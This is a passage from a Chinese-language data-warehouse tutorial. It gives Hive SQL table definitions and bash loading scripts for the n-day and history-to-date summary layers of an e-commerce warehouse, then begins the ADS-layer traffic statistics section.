join</p><p>(</p><p>select</p><p>activity_id,</p><p>order_id,</p><p>split_original_amount,</p><p>split_activity_amount</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>where dt&gt;=date_add(‘$do_date’,-29)</p><p>and dt&lt;=’$do_date’</p><p>and activity_id is not null</p><p>)od</p><p>on act.activity_id=od.activity_id</p><p>group by<br>act.activity_id,activity_name,activity_type_code,activity_type_name,start_time;</p><p>“</p><p>dws_trade_coupon_order_nd=”</p><p>insert overwrite table ${APP}.dws_trade_coupon_order_nd<br>partition(dt=’$do_date’)</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type_code,</p><p>coupon_type_name,</p><p>benefit_rule,</p><p>start_date,</p><p>sum(split_original_amount),</p><p>sum(split_coupon_amount)</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type_code,</p><p>coupon_type_name,</p><p>benefit_rule,</p><p>date_format(start_time,’yyyy-MM-dd’) start_date</p><p>from ${APP}.dim_coupon_full</p><p>where dt=’$do_date’</p><p>and date_format(start_time,’yyyy-MM-dd’)&gt;=date_add(‘$do_date’,-29)</p><p>)cou</p><p>left join</p><p>(</p><p>select</p><p>coupon_id,</p><p>order_id,</p><p>split_original_amount,</p><p>split_coupon_amount</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>where dt&gt;=date_add(‘$do_date’,-29)</p><p>and dt&lt;=’$do_date’</p><p>and coupon_id is not null</p><p>)od</p><p>on cou.id=od.coupon_id</p><p>group by<br>id,coupon_name,coupon_type_code,coupon_type_name,benefit_rule,start_date;</p><p>“</p><p>dws_trade_province_order_nd=”</p><p>insert overwrite table ${APP}.dws_trade_province_order_nd<br>partition(dt=’$do_date’)</p><p>select</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_original_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),activity_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),coupon_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_total_amount_1d,0)),</p><p>sum(order_count_1d),</p><p>sum(order_original_amount_1d),</p><p>sum(activity_reduce_amount_1d),</p><p>sum(coupon_reduce_amount_1d),</p><p>sum(order_total_amount_1d)</p><p>from ${APP}.dws_trade_province_order_1d</p><p>where dt&gt;=date_add(‘$do_date’,-29)</p><p>and dt&lt;=’$do_date’</p><p>group by province_id,province_name,area_code,iso_code,iso_3166_2;</p><p>“</p><p>dws_trade_user_cart_add_nd=”</p><p>insert overwrite table ${APP}.dws_trade_user_cart_add_nd<br>partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),cart_add_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),cart_add_num_1d,0)),</p><p>sum(cart_add_count_1d),</p><p>sum(cart_add_num_1d)</p><p>from ${APP}.dws_trade_user_cart_add_1d</p><p>where dt&gt;=date_add(‘$do_date’,-29)</p><p>and dt&lt;=’$do_date’</p><p>group by user_id;</p><p>“</p><p>dws_trade_user_order_nd=”</p><p>insert overwrite table ${APP}.dws_trade_user_order_nd partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_original_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),activity_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),coupon_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_total_amount_1d,0)),</p><p>sum(order_count_1d),</p><p>sum(order_num_1d),</p><p>sum(order_original_amount_1d),</p><p>sum(activity_reduce_amount_1d),</p><p>sum(coupon_reduce_amount_1d),</p><p>sum(order_total_amount_1d)</p><p>from ${APP}.dws_trade_user_order_1d</p><p>where dt&gt;=date_add(‘$do_date’,-29)</p><p>and dt&lt;=’$do_date’</p><p>group by user_id;</p><p>“</p><p>dws_trade_user_order_refund_nd=”</p><p>insert overwrite table ${APP}.dws_trade_user_order_refund_nd<br>partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_refund_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_refund_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_refund_amount_1d,0)),</p><p>sum(order_refund_count_1d),</p><p>sum(order_refund_num_1d),</p><p>sum(order_refund_amount_1d)</p><p>from ${APP}.dws_trade_user_order_refund_1d</p><p>where dt&gt;=date_add(‘$do_date’,-29)</p><p>and dt&lt;=’$do_date’</p><p>group by user_id;</p><p>“</p><p>dws_trade_user_payment_nd=”</p><p>insert overwrite table ${APP}.dws_trade_user_payment_nd partition (dt =<br>‘$do_date’)</p><p>select user_id,</p><p>sum(if(dt &gt;= date_add(‘$do_date’, -6), payment_count_1d, 0)),</p><p>sum(if(dt &gt;= date_add(‘$do_date’, -6), payment_num_1d, 0)),</p><p>sum(if(dt &gt;= date_add(‘$do_date’, -6), payment_amount_1d, 0)),</p><p>sum(payment_count_1d),</p><p>sum(payment_num_1d),</p><p>sum(payment_amount_1d)</p><p>from ${APP}.dws_trade_user_payment_1d</p><p>where dt &gt;= date_add(‘$do_date’, -29)</p><p>and dt &lt;= ‘$do_date’</p><p>group by user_id;</p><p>“</p><p>dws_trade_user_sku_order_nd=”</p><p>insert overwrite table ${APP}.dws_trade_user_sku_order_nd<br>partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_original_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),activity_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),coupon_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_total_amount_1d,0)),</p><p>sum(order_count_1d),</p><p>sum(order_num_1d),</p><p>sum(order_original_amount_1d),</p><p>sum(activity_reduce_amount_1d),</p><p>sum(coupon_reduce_amount_1d),</p><p>sum(order_total_amount_1d)</p><p>from ${APP}.dws_trade_user_sku_order_1d</p><p>where dt&gt;=date_add(‘$do_date’,-30)</p><p>group by<br>user_id,sku_id,sku_name,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name,tm_id,tm_name;</p><p>“</p><p>dws_trade_user_sku_order_refund_nd=”</p><p>insert overwrite table ${APP}.dws_trade_user_sku_order_refund_nd<br>partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_refund_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_refund_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),order_refund_amount_1d,0)),</p><p>sum(order_refund_count_1d),</p><p>sum(order_refund_num_1d),</p><p>sum(order_refund_amount_1d)</p><p>from ${APP}.dws_trade_user_sku_order_refund_1d</p><p>where dt&gt;=date_add(‘$do_date’,-29)</p><p>and dt&lt;=’$do_date’</p><p>group by<br>user_id,sku_id,sku_name,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name,tm_id,tm_name;</p><p>“</p><p>dws_traffic_page_visitor_page_view_nd=”</p><p>insert overwrite table ${APP}.dws_traffic_page_visitor_page_view_nd<br>partition(dt=’$do_date’)</p><p>select</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>page_id,</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),during_time_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘$do_date’,-6),view_count_1d,0)),</p><p>sum(during_time_1d),</p><p>sum(view_count_1d)</p><p>from ${APP}.dws_traffic_page_visitor_page_view_1d</p><p>where dt&gt;=date_add(‘$do_date’,-29)</p><p>and dt&lt;=’$do_date’</p><p>group by mid_id,brand,model,operate_system,page_id;</p><p>“</p><p>case $1 in</p><p>“dws_trade_activity_order_nd” )</p><p>hive -e “$dws_trade_activity_order_nd”</p><p>;;</p><p>“dws_trade_coupon_order_nd” )</p><p>hive -e “$dws_trade_coupon_order_nd”</p><p>;;</p><p>“dws_trade_province_order_nd” )</p><p>hive -e “$dws_trade_province_order_nd”</p><p>;;</p><p>“dws_trade_user_cart_add_nd” )</p><p>hive -e “$dws_trade_user_cart_add_nd”</p><p>;;</p><p>“dws_trade_user_order_nd” )</p><p>hive -e “$dws_trade_user_order_nd”</p><p>;;</p><p>“dws_trade_user_order_refund_nd” )</p><p>hive -e “$dws_trade_user_order_refund_nd”</p><p>;;</p><p>“dws_trade_user_payment_nd” )</p><p>hive -e “$dws_trade_user_payment_nd”</p><p>;;</p><p>“dws_trade_user_sku_order_nd” )</p><p>hive -e “$dws_trade_user_sku_order_nd”</p><p>;;</p><p>“dws_trade_user_sku_order_refund_nd” )</p><p>hive -e “$dws_trade_user_sku_order_refund_nd”</p><p>;;</p><p>“dws_traffic_page_visitor_page_view_nd” )</p><p>hive -e “$dws_traffic_page_visitor_page_view_nd”</p><p>;;</p><p>“all” )</p><p>hive -e<br>“$dws_trade_activity_order_nd$dws_trade_coupon_order_nd$dws_trade_province_order_nd$dws_trade_user_cart_add_nd$dws_trade_user_order_nd$dws_trade_user_order_refund_nd$dws_trade_user_payment_nd$dws_trade_user_sku_order_nd$dws_trade_user_sku_order_refund_nd$dws_traffic_page_visitor_page_view_nd”</p><p>;;</p><p>esac</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x dws_1d_to_dws_nd.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ dws_1d_to_dws_nd.sh all 2020-06-14</p><h3 id="历史至今汇总表"><a href="#历史至今汇总表" class="headerlink" title="历史至今汇总表"></a>历史至今汇总表</h3><h4 id="交易域用户粒度订单历史至今汇总表"><a href="#交易域用户粒度订单历史至今汇总表" class="headerlink" title="交易域用户粒度订单历史至今汇总表"></a>交易域用户粒度订单历史至今汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_order_td;</p><p>CREATE EXTERNAL TABLE dws_trade_user_order_td</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`order_date_first` STRING COMMENT ‘首次下单日期’,</p><p>`order_date_last` STRING COMMENT ‘末次下单日期’,</p><p>`order_count_td` BIGINT COMMENT ‘下单次数’,</p><p>`order_num_td` BIGINT COMMENT ‘购买商品件数’,</p><p>`original_amount_td` DECIMAL(16, 2) COMMENT ‘原始金额’,</p><p>`activity_reduce_amount_td` DECIMAL(16, 2) COMMENT ‘活动优惠金额’,</p><p>`coupon_reduce_amount_td` DECIMAL(16, 2) COMMENT ‘优惠券优惠金额’,</p><p>`total_amount_td` DECIMAL(16, 2) COMMENT ‘最终金额’</p><p>) COMMENT ‘交易域用户粒度订单历史至今汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_order_td’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dws_trade_user_order_td partition(dt=’2020-06-14’)</p><p>select</p><p>user_id,</p><p>min(dt) login_date_first,</p><p>max(dt) login_date_last,</p><p>sum(order_count_1d) order_count,</p><p>sum(order_num_1d) order_num,</p><p>sum(order_original_amount_1d) original_amount,</p><p>sum(activity_reduce_amount_1d) activity_reduce_amount,</p><p>sum(coupon_reduce_amount_1d) coupon_reduce_amount,</p><p>sum(order_total_amount_1d) total_amount</p><p>from dws_trade_user_order_1d</p><p>group by user_id;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dws_trade_user_order_td partition(dt=’2020-06-15’)</p><p>select</p><p>nvl(old.user_id,new.user_id),</p><p>if(new.user_id is not null and old.user_id is<br>null,’2020-06-15’,old.order_date_first),</p><p>if(new.user_id is not null,’2020-06-15’,old.order_date_last),</p><p>nvl(old.order_count_td,0)+nvl(new.order_count_1d,0),</p><p>nvl(old.order_num_td,0)+nvl(new.order_num_1d,0),</p><p>nvl(old.original_amount_td,0)+nvl(new.order_original_amount_1d,0),</p><p>nvl(old.activity_reduce_amount_td,0)+nvl(new.activity_reduce_amount_1d,0),</p><p>nvl(old.coupon_reduce_amount_td,0)+nvl(new.coupon_reduce_amount_1d,0),</p><p>nvl(old.total_amount_td,0)+nvl(new.order_total_amount_1d,0)</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>order_date_first,</p><p>order_date_last,</p><p>order_count_td,</p><p>order_num_td,</p><p>original_amount_td,</p><p>activity_reduce_amount_td,</p><p>coupon_reduce_amount_td,</p><p>total_amount_td</p><p>from dws_trade_user_order_td</p><p>where dt=date_add(‘2020-06-15’,-1)</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>user_id,</p><p>order_count_1d,</p><p>order_num_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d</p><p>from dws_trade_user_order_1d</p><p>where dt=’2020-06-15’</p><p>)new</p><p>on old.user_id=new.user_id;</p><h4 id="交易域用户粒度支付历史至今汇总表"><a href="#交易域用户粒度支付历史至今汇总表" class="headerlink" title="交易域用户粒度支付历史至今汇总表"></a>交易域用户粒度支付历史至今汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_payment_td;</p><p>CREATE EXTERNAL TABLE dws_trade_user_payment_td</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`payment_date_first` STRING COMMENT ‘首次支付日期’,</p><p>`payment_date_last` STRING COMMENT ‘末次支付日期’,</p><p>`payment_count_td` BIGINT COMMENT ‘最近7日支付次数’,</p><p>`payment_num_td` BIGINT COMMENT ‘最近7日支付商品件数’,</p><p>`payment_amount_td` DECIMAL(16, 2) COMMENT ‘最近7日支付金额’</p><p>) COMMENT ‘交易域用户粒度支付历史至今汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_payment_td’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dws_trade_user_payment_td partition(dt=’2020-06-14’)</p><p>select</p><p>user_id,</p><p>min(dt) payment_date_first,</p><p>max(dt) payment_date_last,</p><p>sum(payment_count_1d) payment_count,</p><p>sum(payment_num_1d) payment_num,</p><p>sum(payment_amount_1d) payment_amount</p><p>from dws_trade_user_payment_1d</p><p>group by user_id;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dws_trade_user_payment_td partition(dt=’2020-06-15’)</p><p>select</p><p>nvl(old.user_id,new.user_id),</p><p>if(old.user_id is null and new.user_id is not<br>null,’2020-06-15’,old.payment_date_first),</p><p>if(new.user_id is not null,’2020-06-15’,old.payment_date_last),</p><p>nvl(old.payment_count_td,0)+nvl(new.payment_count_1d,0),</p><p>nvl(old.payment_num_td,0)+nvl(new.payment_num_1d,0),</p><p>nvl(old.payment_amount_td,0)+nvl(new.payment_amount_1d,0)</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>payment_date_first,</p><p>payment_date_last,</p><p>payment_count_td,</p><p>payment_num_td,</p><p>payment_amount_td</p><p>from dws_trade_user_payment_td</p><p>where dt=date_add(‘2020-06-15’,-1)</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>user_id,</p><p>payment_count_1d,</p><p>payment_num_1d,</p><p>payment_amount_1d</p><p>from dws_trade_user_payment_1d</p><p>where dt=’2020-06-15’</p><p>)new</p><p>on old.user_id=new.user_id;</p><h4 id="用户域用户粒度登录历史至今汇总表"><a href="#用户域用户粒度登录历史至今汇总表" class="headerlink" title="用户域用户粒度登录历史至今汇总表"></a>用户域用户粒度登录历史至今汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_user_user_login_td;</p><p>CREATE EXTERNAL TABLE dws_user_user_login_td</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`login_date_last` STRING COMMENT ‘末次登录日期’,</p><p>`login_count_td` BIGINT COMMENT ‘累计登录次数’</p><p>) COMMENT ‘用户域用户粒度登录历史至今汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_user_user_login_td’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dws_user_user_login_td partition(dt=’2020-06-14’)</p><p>select</p><p>u.id,</p><p>nvl(login_date_last,date_format(create_time,’yyyy-MM-dd’)),</p><p>nvl(login_count_td,1)</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>create_time</p><p>from dim_user_zip</p><p>where dt=’9999-12-31’</p><p>)u</p><p>left join</p><p>(</p><p>select</p><p>user_id,</p><p>max(dt) login_date_last,</p><p>count(*) login_count_td</p><p>from dwd_user_login_inc</p><p>group by user_id</p><p>)l</p><p>on u.id=l.user_id;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dws_user_user_login_td partition(dt=’2020-06-15’)</p><p>select</p><p>nvl(old.user_id,new.user_id),</p><p>if(new.user_id is null,old.login_date_last,’2020-06-15’),</p><p>nvl(old.login_count_td,0)+nvl(new.login_count_1d,0)</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last,</p><p>login_count_td</p><p>from dws_user_user_login_td</p><p>where dt=date_add(‘2020-06-15’,-1)</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>user_id,</p><p>count(*) login_count_1d</p><p>from dwd_user_login_inc</p><p>where dt=’2020-06-15’</p><p>group by user_id</p><p>)new</p><p>on old.user_id=new.user_id;</p><h4 id="数据装载脚本-5"><a href="#数据装载脚本-5" class="headerlink" title="数据装载脚本"></a>数据装载脚本</h4><p><strong>1）首日数据装载脚本</strong></p><p>（1）在hadoop102的/home/atguigu/bin目录下创建dws_1d_to_dws_td_init.sh</p><p>[atguigu@hadoop102 bin]$ vim dws_1d_to_dws_td_init.sh</p><p>（2）编写如下内容</p><p>##!/bin/bash</p><p>APP=gmall</p><p>if [ -n “$2” ] ;then</p><p>do_date=$2</p><p>else</p><p>echo “请传入日期参数”</p><p>exit</p><p>fi</p><p>dws_trade_user_order_td=”</p><p>insert overwrite table ${APP}.dws_trade_user_order_td partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>min(dt) login_date_first,</p><p>max(dt) login_date_last,</p><p>sum(order_count_1d) order_count,</p><p>sum(order_num_1d) order_num,</p><p>sum(order_original_amount_1d) original_amount,</p><p>sum(activity_reduce_amount_1d) activity_reduce_amount,</p><p>sum(coupon_reduce_amount_1d) coupon_reduce_amount,</p><p>sum(order_total_amount_1d) total_amount</p><p>from ${APP}.dws_trade_user_order_1d</p><p>group by user_id;</p><p>“</p><p>dws_trade_user_payment_td=”</p><p>insert overwrite table ${APP}.dws_trade_user_payment_td<br>partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>min(dt) payment_date_first,</p><p>max(dt) payment_date_last,</p><p>sum(payment_count_1d) payment_count,</p><p>sum(payment_num_1d) payment_num,</p><p>sum(payment_amount_1d) payment_amount</p><p>from ${APP}.dws_trade_user_payment_1d</p><p>group by user_id;</p><p>“</p><p>dws_user_user_login_td=”</p><p>insert overwrite table ${APP}.dws_user_user_login_td partition(dt=’$do_date’)</p><p>select</p><p>u.id,</p><p>nvl(login_date_last,date_format(create_time,’yyyy-MM-dd’)),</p><p>nvl(login_count_td,1)</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>create_time</p><p>from ${APP}.dim_user_zip</p><p>where dt=’9999-12-31’</p><p>)u</p><p>left join</p><p>(</p><p>select</p><p>user_id,</p><p>max(dt) login_date_last,</p><p>count(*) login_count_td</p><p>from ${APP}.dwd_user_login_inc</p><p>group by user_id</p><p>)l</p><p>on u.id=l.user_id;</p><p>“</p><p>case $1 in</p><p>“dws_trade_user_order_td” )</p><p>hive -e “$dws_trade_user_order_td”</p><p>;;</p><p>“dws_trade_user_payment_td” )</p><p>hive -e “$dws_trade_user_payment_td”</p><p>;;</p><p>“dws_user_user_login_td” )</p><p>hive -e “$dws_user_user_login_td”</p><p>;;</p><p>“all” )</p><p>hive -e<br>“$dws_trade_user_order_td$dws_trade_user_payment_td$dws_user_user_login_td”</p><p>;;</p><p>esac</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x dws_1d_to_dws_td_init.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ dws_1d_to_dws_td_init.sh all 2020-06-14</p><p><strong>2）每日数据装载脚本</strong></p><p>（1）在hadoop102的/home/atguigu/bin目录下创建dws_1d_to_dws_td.sh</p><p>[atguigu@hadoop102 bin]$ vim dws_1d_to_dws_td.sh</p><p>（2）编写如下内容</p><p>##!/bin/bash</p><p>APP=gmall</p><p>## 如果输入的日期按照取输入日期；如果没输入日期取当前时间的前一天</p><p>if [ -n “$2” ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d “-1 day” +%F`</p><p>fi</p><p>dws_trade_user_order_td=”</p><p>insert overwrite table ${APP}.dws_trade_user_order_td partition(dt=’$do_date’)</p><p>select</p><p>nvl(old.user_id,new.user_id),</p><p>if(new.user_id is not null and old.user_id is<br>null,’$do_date’,old.order_date_first),</p><p>if(new.user_id is not null,’$do_date’,old.order_date_last),</p><p>nvl(old.order_count_td,0)+nvl(new.order_count_1d,0),</p><p>nvl(old.order_num_td,0)+nvl(new.order_num_1d,0),</p><p>nvl(old.original_amount_td,0)+nvl(new.order_original_amount_1d,0),</p><p>nvl(old.activity_reduce_amount_td,0)+nvl(new.activity_reduce_amount_1d,0),</p><p>nvl(old.coupon_reduce_amount_td,0)+nvl(new.coupon_reduce_amount_1d,0),</p><p>nvl(old.total_amount_td,0)+nvl(new.order_total_amount_1d,0)</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>order_date_first,</p><p>order_date_last,</p><p>order_count_td,</p><p>order_num_td,</p><p>original_amount_td,</p><p>activity_reduce_amount_td,</p><p>coupon_reduce_amount_td,</p><p>total_amount_td</p><p>from ${APP}.dws_trade_user_order_td</p><p>where dt=date_add(‘$do_date’,-1)</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>user_id,</p><p>order_count_1d,</p><p>order_num_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d</p><p>from ${APP}.dws_trade_user_order_1d</p><p>where dt=’$do_date’</p><p>)new</p><p>on old.user_id=new.user_id;</p><p>“</p><p>dws_trade_user_payment_td=”</p><p>insert overwrite table ${APP}.dws_trade_user_payment_td<br>partition(dt=’$do_date’)</p><p>select</p><p>nvl(old.user_id,new.user_id),</p><p>if(old.user_id is null and new.user_id is not<br>null,’$do_date’,old.payment_date_first),</p><p>if(new.user_id is not null,’$do_date’,old.payment_date_last),</p><p>nvl(old.payment_count_td,0)+nvl(new.payment_count_1d,0),</p><p>nvl(old.payment_num_td,0)+nvl(new.payment_num_1d,0),</p><p>nvl(old.payment_amount_td,0)+nvl(new.payment_amount_1d,0)</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>payment_date_first,</p><p>payment_date_last,</p><p>payment_count_td,</p><p>payment_num_td,</p><p>payment_amount_td</p><p>from ${APP}.dws_trade_user_payment_td</p><p>where dt=date_add(‘$do_date’,-1)</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>user_id,</p><p>payment_count_1d,</p><p>payment_num_1d,</p><p>payment_amount_1d</p><p>from ${APP}.dws_trade_user_payment_1d</p><p>where dt=’$do_date’</p><p>)new</p><p>on old.user_id=new.user_id;</p><p>“</p><p>dws_user_user_login_td=”</p><p>insert overwrite table ${APP}.dws_user_user_login_td partition(dt=’$do_date’)</p><p>select</p><p>nvl(old.user_id,new.user_id),</p><p>if(new.user_id is null,old.login_date_last,’$do_date’),</p><p>nvl(old.login_count_td,0)+nvl(new.login_count_1d,0)</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last,</p><p>login_count_td</p><p>from ${APP}.dws_user_user_login_td</p><p>where dt=date_add(‘$do_date’,-1)</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>user_id,</p><p>count(*) login_count_1d</p><p>from ${APP}.dwd_user_login_inc</p><p>where dt=’$do_date’</p><p>group by user_id</p><p>)new</p><p>on old.user_id=new.user_id;</p><p>“</p><p>case $1 in</p><p>“dws_trade_user_order_td” )</p><p>hive -e “$dws_trade_user_order_td”</p><p>;;</p><p>“dws_trade_user_payment_td” )</p><p>hive -e “$dws_trade_user_payment_td”</p><p>;;</p><p>“dws_user_user_login_td” )</p><p>hive -e “$dws_user_user_login_td”</p><p>;;</p><p>“all” )</p><p>hive -e<br>“$dws_trade_user_order_td$dws_trade_user_payment_td$dws_user_user_login_td”</p><p>;;</p><p>esac</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x dws_1d_to_dws_td.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ dws_1d_to_dws_td.sh all 2020-06-14</p><h2 id="第11章-数仓开发之ADS层"><a href="#第11章-数仓开发之ADS层" class="headerlink" title="第11章 数仓开发之ADS层"></a>第11章 数仓开发之ADS层</h2><h3 id="流量主题"><a href="#流量主题" class="headerlink" title="流量主题"></a>流量主题</h3><h4 id="各渠道流量统计"><a href="#各渠道流量统计" class="headerlink" title="各渠道流量统计"></a>各渠道流量统计</h4><p>需求说明如下</p><table><thead><tr><th>统计周期</th><th>统计粒度</th><th>指标</th><th>说明</th></tr></thead><tbody><tr><td>最近1/7/30日</td><td>渠道</td><td>访客数</td><td>统计访问人数</td></tr><tr><td>最近1/7/30日</td><td>渠道</td><td>会话平均停留时长</td><td>统计每个会话平均停留时长</td></tr><tr><td>最近1/7/30日</td><td>渠道</td><td>会话平均浏览页面数</td><td>统计每个会话平均浏览页面数</td></tr><tr><td>最近1/7/30日</td><td>渠道</td><td>会话总数</td><td>统计会话总数</td></tr><tr><td>最近1/7/30日</td><td>渠道</td><td>跳出率</td><td>只有一个页面的会话的比例</td></tr></tbody></table><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_traffic_stats_by_channel;</p><p>CREATE EXTERNAL TABLE ads_traffic_stats_by_channel</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`recent_days` BIGINT COMMENT ‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`channel` STRING COMMENT ‘渠道’,</p><p>`uv_count` BIGINT COMMENT ‘访客人数’,</p><p>`avg_duration_sec` BIGINT COMMENT ‘会话平均停留时长，单位为秒’,</p><p>`avg_page_count` BIGINT COMMENT ‘会话平均浏览页面数’,</p><p>`sv_count` BIGINT COMMENT ‘会话数’,</p><p>`bounce_rate` DECIMAL(16, 2) COMMENT ‘跳出率’</p><p>) COMMENT ‘各渠道流量统计’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_traffic_stats_by_channel/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_traffic_stats_by_channel</p><p>select * from ads_traffic_stats_by_channel</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>recent_days,</p><p>channel,</p><p>cast(count(distinct(mid_id)) as bigint) uv_count,</p><p>cast(avg(during_time_1d)/1000 as bigint) avg_duration_sec,</p><p>cast(avg(page_count_1d) as bigint) avg_page_count,</p><p>cast(count(*) as bigint) sv_count,</p><p>cast(sum(if(page_count_1d=1,1,0))/count(*) as decimal(16,2)) bounce_rate</p><p>from dws_traffic_session_page_view_1d lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt&gt;=date_add(‘2020-06-14’,-recent_days+1)</p><p>group by recent_days,channel;</p><h4 id="路径分析"><a href="#路径分析" class="headerlink" title="路径分析"></a>路径分析</h4><p>用户路径分析，顾名思义，就是指用户在APP或网站中的访问路径。为了衡量网站优化的效果或营销推广的效果，以及了解用户行为偏好，时常要对访问路径进行分析。</p><p>用户访问路径的可视化通常使用桑基图。如下图所示，该图可真实还原用户的访问路径，包括页面跳转和页面访问次序。</p><p>桑基图需要我们提供每种页面跳转的次数，每个跳转由source/target表示，source指跳转起始页面，target表示跳转终到页面。</p><p><img 